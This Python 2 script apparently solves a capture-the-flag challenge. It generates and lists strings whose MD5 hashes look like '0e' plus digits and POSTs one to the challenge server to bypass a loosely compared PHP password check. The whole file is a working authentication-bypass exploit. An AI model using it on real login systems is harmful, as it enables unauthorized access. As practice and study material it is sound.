#!/usr/bin/env python

import requests
import random
import string
import hashlib

def getMd5(word):
    m = hashlib.md5()
    m.update(word)
    return m.hexdigest()

def isDecimal(num):
    return (ord(num) >= ord('0') and ord(num) <= ord('9'))

def check(md5):
    for i in md5:
        if not isDecimal(i):
            return False
    return True

def getPayloads():
    while True:
        password = ""
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        md5 = getMd5(password)
        if md5.startswith("0e"):
            print "[?] [%s]" % (md5)
            if (check(md5[2:])):
                print "[+] Found : [%s] -> [%s]" % (password, md5)
                return password

examples = ["QNKCDZO", "s878926199a", "s155964671a", "s214587387a", "s214587387a", "s878926199a", "s1091221200a", "s1885207154a", "s1502113478a", "s1885207154a", "s1836677006a", "s155964671a", "s1184209335a", "s1665632922a", "s1502113478a", "s1836677006a", "s1091221200a", "s155964671a", "s1502113478a", "s155964671a", "s1665632922a", "s155964671a", "s1091221200a", "s1836677006a", "s1885207154a", "s532378020a", "s878926199a", "s1091221200a", "s214587387a", "s1502113478a", "s1091221200a", "s1665632922a", "s1885207154a", "s1836677006a", "s1665632922a", "s878926199a",]

def batchCheck(examples):
    for i in examples:
        print "[%s] -> [%s] -> [%s]" % ("QNKCDZO", getMd5(i), check(getMd5(i)[2:]))

url = "http://web2.sniperoj.cn:10001/"

data = {
    "password":examples[1]
}

response = requests.post(url, data=data)
print "[+] Result : "
print response.text
